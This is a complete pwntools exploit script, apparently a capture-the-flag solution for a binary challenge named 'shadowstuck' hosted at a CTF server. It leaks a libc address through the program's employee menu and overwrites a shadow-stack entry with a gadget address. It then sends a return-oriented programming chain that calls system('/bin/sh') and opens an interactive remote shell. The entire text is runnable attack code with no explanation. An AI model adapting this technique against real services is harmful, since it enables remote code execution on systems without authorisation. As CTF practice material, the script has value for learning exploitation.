#!/usr/bin/python3
from pwn import process, remote, ELF, context, pack, unpack, gdb

context.arch = 'amd64'
context.bits = 64

def employee_exit(reason):
    p.recvuntil(b"> ")
    p.sendline(b"Q")
    p.recvline()
    p.sendline(reason)

def read_employee(employee_num):
    p.recvuntil(b"> ")
    p.sendline(b"R")
    p.recvuntil(b"> ")
    p.sendline('%d' % employee_num)
    a = p.recvline()
    if b'Could not' in a:
        raise Exception("Could not find employee")
    employee_name = a.split(b': ')[1][:-1]
    return employee_name

def fire_employee(employee_name, reason):
    p.recvuntil(b"> ")
    p.sendline(b"F")
    p.recvuntil(b"> ")
    p.sendline(employee_name)
    if b'Could not' in p.recvline():
        raise Exception("Could not find employee")
    p.recvuntil(b"> ")
    p.sendline(reason)

def add_employee(employee_name):
    p.recvuntil(b"> ")
    p.sendline(b"A")
    p.recvuntil(b"> ")
    p.sendline(employee_name)

def change_employee(employee_num, employee_new_name):
    p.recvuntil(b"> ")
    p.sendline(b"C")
    p.recvuntil(b"> ")
    p.sendline("%d" % employee_num)
    p.recvuntil(b"> ")
    p.sendline(employee_new_name)

p = remote("challenges.ctf.kaf.sh", 8000)
#p = process('./shadowstuck', env={"LD_PRELOAD":"./libc-2.31.so"})

libc = ELF('./libc-2.31.so')

base_shadowstack = int(p.recvline().split(b'at ')[1][:-1], 16)
print("[+] Shadowstack @ 0x%x" % base_shadowstack)

add_employee("Mike") #0

fire_employee("Mike", b'a' * 0x10 + pack(base_shadowstack)[:-2])
leak = unpack(read_employee(1).ljust(8, b'\x00'))
print("[+] Leak libc @ 0x%x" % leak)
libc.address = leak - 159923
print("[+] Libc @ 0x%x" % libc.address)

pop_rdi_gadget = libc.address + 0x26b72

change_employee(1, pack(pop_rdi_gadget).rstrip(b'\x00'))
assert unpack(read_employee(1).ljust(8, b'\x00')) == pop_rdi_gadget

rop = b"aaaaaaaaaaaaaaaaaaaaaaaaa" #padding
rop += pack(pop_rdi_gadget)
rop += pack(next(libc.search(b'/bin/sh')))
rop += pack(pop_rdi_gadget + 1) #for stack alignment
rop += pack(libc.symbols['system'])

employee_exit(rop)

p.interactive()